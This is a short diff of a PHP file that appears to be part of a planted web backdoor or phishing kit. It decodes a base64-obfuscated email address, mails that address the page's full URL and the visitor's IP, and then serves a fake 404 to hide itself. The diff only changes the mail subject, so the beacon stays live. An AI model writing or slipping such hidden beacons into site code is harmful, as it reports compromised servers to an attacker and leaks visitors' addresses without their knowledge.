@@ -7,7 +7,7 @@ header('Content-Type: text/html; charset=UTF-8');
 $dm = base64_decode('YWt1bmVwZmYyMDBAZ21haWwuY29t');
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $ma = "fix $x_path : *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($dm, "MD", $ma, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+mail($dm, "GEL4Y", $ma, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
 <?php
 http_response_code(404);
